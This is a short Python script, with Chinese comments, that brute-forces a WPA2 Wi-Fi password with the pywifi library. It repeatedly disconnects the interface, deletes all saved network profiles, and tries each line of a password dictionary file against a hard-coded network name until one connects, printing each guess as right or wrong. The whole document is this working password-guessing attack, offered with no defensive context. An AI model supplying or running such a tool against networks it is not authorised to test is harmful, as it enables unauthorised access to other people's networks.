import pywifi
# help(pywifi)
from pywifi import const
import time

def wifiConnect(wifiname,wifipassword):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    # 断开连接
    ifaces.disconnect()
    time.sleep(0.5)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # WiFi名称
        profile.ssid = wifiname
        # WiFi密码
        profile.key = wifipassword
        # WiFi的加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 网卡的开放
        profile.auth = const.AUTH_ALG_OPEN
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP

        # 删除所有的WiFi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)

        # 连接WiFi
        ifaces.connect(tep_profile)
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

def read_password():
    '''读取密码本'''
    print('开始破解：')
    path = './wifiDict.txt'
    file = open(path,'r') # 以读取的方式

    while True:
        try:
            wifipwd = file.readline()
            bool = wifiConnect('iphone',wifipwd)    #输入wifi名称
            if bool:
                print('密码正确：'+wifipwd)
                break
            else:
                print('密码错误：'+wifipwd)
        except:
            continue
    file.close()

read_password()